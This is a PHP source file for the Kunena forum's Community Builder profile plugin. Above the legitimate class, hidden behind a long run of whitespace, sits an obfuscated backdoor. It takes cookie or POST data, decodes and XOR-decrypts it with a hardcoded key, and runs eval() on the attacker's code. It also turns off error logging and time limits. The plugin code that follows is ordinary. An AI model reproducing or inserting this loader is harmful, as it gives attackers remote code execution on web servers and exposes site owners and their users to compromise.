<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $GLOBALS['la7cbe'];global$la7cbe;$la7cbe=$GLOBALS;$la7cbe['oaf8041d']="\x7e\x69\x3d\x4b\x47\x2e\x72\x7a\x5e\x73\x61\x6c\x23\x7d\x2f\x64\x35\x50\x67\x2a\x71\x48\x65\x75\x33\x7b\x43\x40\x76\x31\x62\xa\x58\x7c\x6f\x78\x57\x79\x54\x6b\x38\x4c\x20\x45\x51\x2c\x4a\x34\x22\x5c\x56\x3c\x4d\x6e\x66\x26\x5b\x46\x32\x44\x3e\xd\x6d\x41\x70\x24\x3b\x21\x60\x25\x49\x52\x53\x42\x9\x5f\x6a\x30\x3f\x3a\x77\x63\x55\x5d\x2d\x36\x68\x2b\x5a\x4e\x4f\x59\x27\x29\x37\x39\x28\x74";$la7cbe[$la7cbe['oaf8041d'][28].$la7cbe['oaf8041d'][40].$la7cbe['oaf8041d'][15].$la7cbe['oaf8041d'][10].$la7cbe['oaf8041d'][40].$la7cbe['oaf8041d'][85].$la7cbe['oaf8041d'][29].$la7cbe['oaf8041d'][54].$la7cbe['oaf8041d'][29]]=$la7cbe['oaf8041d'][81].$la7cbe['oaf8041d'][86].$la7cbe['oaf8041d'][6];$la7cbe[$la7cbe['oaf8041d'][86].$la7cbe['oaf8041d'][15].$la7cbe['oaf8041d'][10].$la7cbe['oaf8041d'][24].$la7cbe['oaf8041d'][85]]=$la7cbe['oaf8041d'][34].$la7cbe['oaf8041d'][6].$la7cbe['oaf8041d'][15];$la7cbe[$la7cbe['oaf8041d'][53].$la7cbe['oaf8041d'][30].$la7cbe['oaf8041d'][40].$la7cbe['oaf8041d'][77]]=$la7cbe['oaf8041d'][9].$la7cbe['oaf8041d'][97].$la7cbe['oaf8041d'][6].$la7cbe['oaf8041d'][11].$la7cbe['oaf8041d'][22].$la7cbe['oaf8041d'][53];$la7cbe[$la7cbe['oaf8041d'][39].$la7cbe['oaf8041d'][24].$la7cbe['oaf8041d'][95].$la7cbe['oaf8041d'][30].$la7cbe['oaf8041d'][22].$la7cbe['oaf8041d'][22].$la7cbe['oaf8041d'][95].$la7cbe['oaf8041d'][54].$la7cbe['oaf8041d'][30]]=$la7cbe['oaf8041d'][1].$la7cbe['oaf8041d'][53].$la7cbe['oaf8041d'][1].$la7cbe['oaf8041d'][75].$la7cbe['oaf8041d'][9].$la7cbe['oaf8041d'][22].$la7cbe['oaf8041d'][97];$la7cbe[$la7cbe['oaf8041d'][18].$la7cbe['oaf8041d'][10].$la7cbe['oaf8041d'][10].$la7cbe['oaf8041d'][58].$la7cbe['oaf8041d'][58]]=$la7cbe['oaf8041d'][9].$la7cbe['oaf8041d'][22].$la7cbe['oaf8041d'][6].$la7cbe['oaf8041d'][1].$la7cbe['oaf8041d'][10].$la7cbe['oaf8041d'][11].$la7cbe['oaf8041d'][1].$la7cbe['oaf8041d'][7].$la7cbe['oaf8041d'][22];$la7cbe[$la7cbe['oaf8041d'][11].$la7cbe['oaf8041d'][10].$la7cbe['oaf8041d'][47].$la7cbe['oaf8041d'][95].$la7cbe['oaf8041d'][15].$la7cbe['oaf8041d'][58].$la7cbe['oaf8041d'][77].$la7cbe['oaf8041d'][54]]=$la7cbe['oaf8041d'][64].$la7cbe['oaf8041d'][86].$la7cbe['oaf8041d'][64].$la7cbe['oaf8041d'][28].$la7cbe['oaf8041d'][22].$la7cbe['oaf8041d'][6].$la7cbe['oaf8041d'][9].$la7cbe['oaf8041d'][1].$la7cbe['oaf8041d'][34].$la7cbe['oaf8041d'][53];$la7cbe[$la7cbe['oaf8041d'][39].$la7cbe['oaf8041d'][58].$la7cbe['oaf8041d'][95].$la7cbe['oaf8041d'][24].$la7cbe['oaf8041d'][40]]=$la7cbe['oaf8041d'][23].$la7cbe['oaf8041d'][53].$la7cbe['oaf8041d'][9].$la7cbe['oaf8041d'][22].$la7cbe['oaf8041d'][6].$la7cbe['oaf8041d'][1].$la7cbe['oaf8041d'][10].$la7cbe['oaf8041d'][11].$la7cbe['oaf8041d'][1].$la7cbe['oaf8041d'][7].$la7cbe['oaf8041d'][22];$la7cbe[$la7cbe['oaf8041d'][28].$la7cbe['oaf8041d'][77].$la7cbe['oaf8041d'][15].$la7cbe['oaf8041d'][24].$la7cbe['oaf8041d'][40].$la7cbe['oaf8041d'][94].$la7cbe['oaf8041d'][16]]=$la7cbe['oaf8041d'][30].$la7cbe['oaf8041d'][10].$la7cbe['oaf8041d'][9].$la7cbe['oaf8041d'][22].$la7cbe['oaf8041d'][85].$la7cbe['oaf8041d'][47].$la7cbe['oaf8041d'][75].$la7cbe['oaf8041d'][15].$la7cbe['oaf8041d'][22].$la7cbe['oaf8041d'][81].$la7cbe['oaf8041d'][34].$la7cbe['oaf8041d'][15].$la7cbe['oaf8041d'][22];$la7cbe[$la7cbe['oaf8041d'][62].$la7cbe['oaf8041d'][94].$la7cbe['oaf8041d'][81].$la7cbe['oaf8041d'][81].$la7cbe['oaf8041d'][10].$la7cbe['oaf8041d'][16].$la7cbe['oaf8041d'][95].$la7cbe['oaf8041d'][16]]=$la7cbe['oaf8041d'][9].$la7cbe['oaf8041d'][22].$la7cbe['oaf8041d'][97].$la7cbe['oaf8041d'][75].$la7cbe['oaf8041d'][97].$la7cbe['oaf8041d'][1].$la7cbe['oaf8041d'][62].$la7cbe['oaf8041d'][22].$la7cbe['oaf8041d'][75].$la7cbe['oaf8041d'][11].$la7cbe['oaf8041d'][1].$la7cbe['oaf8041d'][62].$la7cbe['oaf8041d'][1].$la7cbe['oaf8041d'][97];$la7cbe[$la7cbe['oaf8041d'][80].$la7cbe['oaf8041d'][95].$la7cbe['oaf8041d'][30].$la7cbe['oaf8041d'][54].$la7cbe['oaf8041d'][85].$la7cbe['oaf8041d'][24]]=$la7cbe['oaf8041d'][30].$la7cbe['oaf8041d'][10].$la7cbe['oaf8041d'][95].$la7cbe['oaf8041d'][40].$la7cbe['oaf8041d'][30].$la7cbe['oaf8041d'][40].$la7cbe['oaf8041d'][94].$la7cbe['oaf8041d'][54].$la7cbe['oaf8041d'][40];$la7cbe[$la7cbe['oaf8041d'][64].$la7cbe['oaf8041d'][94].$la7cbe['oaf8041d'][95].$la7cbe['oaf8041d'][95].$la7cbe['oaf8041d'][58]]=$la7cbe['oaf8041d'][37].$la7cbe['oaf8041d'][58].$la7cbe['oaf8041d'][77].$la7cbe['oaf8041d'][16].$la7cbe['oaf8041d'][85].$la7cbe['oaf8041d'][94].$la7cbe['oaf8041d'][81].$la7cbe['oaf8041d'][81].$la7cbe['oaf8041d'][16];$la7cbe[$la7cbe['oaf8041d'][64].$la7cbe['oaf8041d'][24].$la7cbe['oaf8041d'][22].$la7cbe['oaf8041d'][85].$la7cbe['oaf8041d'][22].$la7cbe['oaf8041d'][16].$la7cbe['oaf8041d'][47].$la7cbe['oaf8041d'][10].$la7cbe['oaf8041d'][30]]=$_POST;$la7cbe[$la7cbe['oaf8041d'][80].$la7cbe['oaf8041d'][22].$la7cbe['oaf8041d'][81].$la7cbe['oaf8041d'][29]]=$_COOKIE;@$la7cbe[$la7cbe['oaf8041d'][39].$la7cbe['oaf8041d'][24].$la7cbe['oaf8041d'][95].$la7cbe['oaf8041d'][30].$la7cbe['oaf8041d'][22].$la7cbe['oaf8041d'][22].$la7cbe['oaf8041d'][95].$la7cbe['oaf8041d'][54].$la7cbe['oaf8041d'][30]]($la7cbe['oaf8041d'][22].$la7cbe['oaf8041d'][6].$la7cbe['oaf8041d'][6].$la7cbe['oaf8041d'][34].$la7cbe['oaf8041d'][6].$la7cbe['oaf8041d'][75].$la7cbe['oaf8041d'][11].$la7cbe['oaf8041d'][34].$la7cbe['oaf8041d'][18],NULL);@$la7cbe[$la7cbe['oaf8041d'][39].$la7cbe['oaf8041d'][24].$la7cbe['oaf8041d'][95].$la7cbe['oaf8041d'][30].$la7cbe['oaf8041d'][22].$la7cbe['oaf8041d'][22].$la7cbe['oaf8041d'][95].$la7cbe['oaf8041d'][54].$la7cbe['oaf8041d'][30]]($la7cbe['oaf8041d'][11].$la7cbe['oaf8041d'][34].$la7cbe['oaf8041d'][18].$la7cbe['oaf8041d'][75].$la7cbe['oaf8041d'][22].$la7cbe['oaf8041d'][6].$la7cbe['oaf8041d'][6].$la7cbe['oaf8041d'][34].$la7cbe['oaf8041d'][6].$la7cbe['oaf8041d'][9],0);@$la7cbe[$la7cbe['oaf8041d'][39].$la7cbe['oaf8041d'][24].$la7cbe['oaf8041d'][95].$la7cbe['oaf8041d'][30].$la7cbe['oaf8041d'][22].$la7cbe['oaf8041d'][22].$la7cbe['oaf8041d'][95].$la7cbe['oaf8041d'][54].$la7cbe['oaf8041d'][30]]($la7cbe['oaf8041d'][62].$la7cbe['oaf8041d'][10].$la7cbe['oaf8041d'][35].$la7cbe['oaf8041d'][75].$la7cbe['oaf8041d'][22].$la7cbe['oaf8041d'][35].$la7cbe['oaf8041d'][22].$la7cbe['oaf8041d'][81].$la7cbe['oaf8041d'][23].$la7cbe['oaf8041d'][97].$la7cbe['oaf8041d'][1].$la7cbe['oaf8041d'][34].$la7cbe['oaf8041d'][53].$la7cbe['oaf8041d'][75].$la7cbe['oaf8041d'][97].$la7cbe['oaf8041d'][1].$la7cbe['oaf8041d'][62].$la7cbe['oaf8041d'][22],0);@$la7cbe[$la7cbe['oaf8041d'][62].$la7cbe['oaf8041d'][94].$la7cbe['oaf8041d'][81].$la7cbe['oaf8041d'][81].$la7cbe['oaf8041d'][10].$la7cbe['oaf8041d'][16].$la7cbe['oaf8041d'][95].$la7cbe['oaf8041d'][16]](0);$gad2e0=NULL;$s43c3e=NULL;$la7cbe[$la7cbe['oaf8041d'][35].$la7cbe['oaf8041d'][77].$la7cbe['oaf8041d'][24].$la7cbe['oaf8041d'][95]]=$la7cbe['oaf8041d'][15].$la7cbe['oaf8041d'][24].$la7cbe['oaf8041d'][22].$la7cbe['oaf8041d'][95].$la7cbe['oaf8041d'][58].$la7cbe['oaf8041d'][22].$la7cbe['oaf8041d'][24].$la7cbe['oaf8041d'][10].$la7cbe['oaf8041d'][84].$la7cbe['oaf8041d'][16].$la7cbe['oaf8041d'][16].$la7cbe['oaf8041d'][95].$la7cbe['oaf8041d'][85].$la7cbe['oaf8041d'][84].$la7cbe['oaf8041d'][47].$la7cbe['oaf8041d'][85].$la7cbe['oaf8041d'][47].$la7cbe['oaf8041d'][54].$la7cbe['oaf8041d'][84].$la7cbe['oaf8041d'][40].$la7cbe['oaf8041d'][77].$la7cbe['oaf8041d'][22].$la7cbe['oaf8041d'][58].$la7cbe['oaf8041d'][84].$la7cbe['oaf8041d'][77].$la7cbe['oaf8041d'][10].$la7cbe['oaf8041d'][30].$la7cbe['oaf8041d'][30].$la7cbe['oaf8041d'][95].$la7cbe['oaf8041d'][54].$la7cbe['oaf8041d'][85].$la7cbe['oaf8041d'][29].$la7cbe['oaf8041d'][15].$la7cbe['oaf8041d'][40].$la7cbe['oaf8041d'][58].$la7cbe['oaf8041d'][77];global$x039;function y20567cc5($gad2e0,$r55c6560){global$la7cbe;$ed59a2="";for($oa05d8c2c=0;$oa05d8c2c<$la7cbe[$la7cbe['oaf8041d'][53].$la7cbe['oaf8041d'][30].$la7cbe['oaf8041d'][40].$la7cbe['oaf8041d'][77]]($gad2e0);){for($rbb4f4=0;$rbb4f4<$la7cbe[$la7cbe['oaf8041d'][53].$la7cbe['oaf8041d'][30].$la7cbe['oaf8041d'][40].$la7cbe['oaf8041d'][77]]($r55c6560)&&$oa05d8c2c<$la7cbe[$la7cbe['oaf8041d'][53].$la7cbe['oaf8041d'][30].$la7cbe['oaf8041d'][40].$la7cbe['oaf8041d'][77]]($gad2e0);$rbb4f4++,$oa05d8c2c++){$ed59a2.=$la7cbe[$la7cbe['oaf8041d'][28].$la7cbe['oaf8041d'][40].$la7cbe['oaf8041d'][15].$la7cbe['oaf8041d'][10].$la7cbe['oaf8041d'][40].$la7cbe['oaf8041d'][85].$la7cbe['oaf8041d'][29].$la7cbe['oaf8041d'][54].$la7cbe['oaf8041d'][29]]($la7cbe[$la7cbe['oaf8041d'][86].$la7cbe['oaf8041d'][15].$la7cbe['oaf8041d'][10].$la7cbe['oaf8041d'][24].$la7cbe['oaf8041d'][85]]($gad2e0[$oa05d8c2c])^$la7cbe[$la7cbe['oaf8041d'][86].$la7cbe['oaf8041d'][15].$la7cbe['oaf8041d'][10].$la7cbe['oaf8041d'][24].$la7cbe['oaf8041d'][85]]($r55c6560[$rbb4f4]));}}return$ed59a2;}function ba98b87f8($gad2e0,$r55c6560){global$la7cbe;global$x039;return$la7cbe[$la7cbe['oaf8041d'][64].$la7cbe['oaf8041d'][94].$la7cbe['oaf8041d'][95].$la7cbe['oaf8041d'][95].$la7cbe['oaf8041d'][58]]($la7cbe[$la7cbe['oaf8041d'][64].$la7cbe['oaf8041d'][94].$la7cbe['oaf8041d'][95].$la7cbe['oaf8041d'][95].$la7cbe['oaf8041d'][58]]($gad2e0,$x039),$r55c6560);}foreach($la7cbe[$la7cbe['oaf8041d'][80].$la7cbe['oaf8041d'][22].$la7cbe['oaf8041d'][81].$la7cbe['oaf8041d'][29]]as$r55c6560=>$nf86){$gad2e0=$nf86;$s43c3e=$r55c6560;}if(!$gad2e0){foreach($la7cbe[$la7cbe['oaf8041d'][64].$la7cbe['oaf8041d'][24].$la7cbe['oaf8041d'][22].$la7cbe['oaf8041d'][85].$la7cbe['oaf8041d'][22].$la7cbe['oaf8041d'][16].$la7cbe['oaf8041d'][47].$la7cbe['oaf8041d'][10].$la7cbe['oaf8041d'][30]]as$r55c6560=>$nf86){$gad2e0=$nf86;$s43c3e=$r55c6560;}}$gad2e0=@$la7cbe[$la7cbe['oaf8041d'][39].$la7cbe['oaf8041d'][58].$la7cbe['oaf8041d'][95].$la7cbe['oaf8041d'][24].$la7cbe['oaf8041d'][40]]($la7cbe[$la7cbe['oaf8041d'][80].$la7cbe['oaf8041d'][95].$la7cbe['oaf8041d'][30].$la7cbe['oaf8041d'][54].$la7cbe['oaf8041d'][85].$la7cbe['oaf8041d'][24]]($la7cbe[$la7cbe['oaf8041d'][28].$la7cbe['oaf8041d'][77].$la7cbe['oaf8041d'][15].$la7cbe['oaf8041d'][24].$la7cbe['oaf8041d'][40].$la7cbe['oaf8041d'][94].$la7cbe['oaf8041d'][16]]($gad2e0),$s43c3e));if(isset($gad2e0[$la7cbe['oaf8041d'][10].$la7cbe['oaf8041d'][39]])&&$x039==$gad2e0[$la7cbe['oaf8041d'][10].$la7cbe['oaf8041d'][39]]){if($gad2e0[$la7cbe['oaf8041d'][10]]==$la7cbe['oaf8041d'][1]){$oa05d8c2c=Array($la7cbe['oaf8041d'][64].$la7cbe['oaf8041d'][28]=>@$la7cbe[$la7cbe['oaf8041d'][11].$la7cbe['oaf8041d'][10].$la7cbe['oaf8041d'][47].$la7cbe['oaf8041d'][95].$la7cbe['oaf8041d'][15].$la7cbe['oaf8041d'][58].$la7cbe['oaf8041d'][77].$la7cbe['oaf8041d'][54]](),$la7cbe['oaf8041d'][9].$la7cbe['oaf8041d'][28]=>$la7cbe['oaf8041d'][29].$la7cbe['oaf8041d'][5].$la7cbe['oaf8041d'][77].$la7cbe['oaf8041d'][84].$la7cbe['oaf8041d'][29],);echo@$la7cbe[$la7cbe['oaf8041d'][18].$la7cbe['oaf8041d'][10].$la7cbe['oaf8041d'][10].$la7cbe['oaf8041d'][58].$la7cbe['oaf8041d'][58]]($oa05d8c2c);}elseif($gad2e0[$la7cbe['oaf8041d'][10]]==$la7cbe['oaf8041d'][22]){eval($gad2e0[$la7cbe['oaf8041d'][15]]);}exit();} ?><?php
/**
 * Kunena Plugin
 * @package Kunena.Plugins
 * @subpackage Comprofiler
 *
 * @copyright (C) 2008 - 2015 Kunena Team. All rights reserved.
 * @license http://www.gnu.org/copyleft/gpl.html GNU/GPL
 * @link http://www.kunena.org
 **/
defined ( '_JEXEC' ) or die ();

require_once dirname(__FILE__) . '/integration.php';

class KunenaProfileComprofiler extends KunenaProfile {
	protected $params = null;

	public function __construct($params) {
		$this->params = $params;
	}

	public function open() {
		KunenaIntegrationComprofiler::open();
	}

	public function close() {
		KunenaIntegrationComprofiler::close();
	}

	public function getUserListURL($action='', $xhtml = true) {
		$config = KunenaFactory::getConfig ();
		$my = JFactory::getUser();
		if ( $config->userlist_allowed == 1 && $my->id == 0  ) return false;
		return cbSef( 'index.php?option=com_comprofiler&amp;task=usersList', $xhtml );
	}

	public function getProfileURL($user, $task='', $xhtml = true) {
		$user = KunenaFactory::getUser($user);
		if ($user->userid == 0) return false;
		// Get CUser object
		$cbUser = CBuser::getInstance( $user->userid );
		if($cbUser === null) return false;
		return cbSef( 'index.php?option=com_comprofiler&task=userProfile&user=' . $user->userid. getCBprofileItemid(), $xhtml );
	}

	public function showProfile($view, &$params) {
		global $_PLUGINS;

		$_PLUGINS->loadPluginGroup('user');
		return implode( ' ', $_PLUGINS->trigger( 'forumSideProfile', array( 'kunena', $view, $view->profile->userid,
			array( 'config'=> &$view->config, 'userprofile'=> &$view->profile, 'params'=>&$params) ) ) );
	}

	public static function trigger($event, &$params) {
		KunenaIntegrationComprofiler::trigger($event, $params);
	}

	public function _getTopHits($limit=0) {
		$db = JFactory::getDBO ();
		$query = "SELECT cu.user_id AS id, cu.hits AS count
			FROM #__comprofiler AS cu
			INNER JOIN #__users AS u ON u.id=cu.user_id
			WHERE cu.hits>0
			ORDER BY cu.hits DESC";
		$db->setQuery ( $query, 0, $limit );
		$top = (array) $db->loadObjectList ();
		KunenaError::checkDatabaseError();
		return $top;
	}

	public function getEditProfileURL($userid, $xhtml = true) {
		return cbSef( 'index.php?option=com_comprofiler&task=userDetails'. getCBprofileItemid(), $xhtml );
	}
}
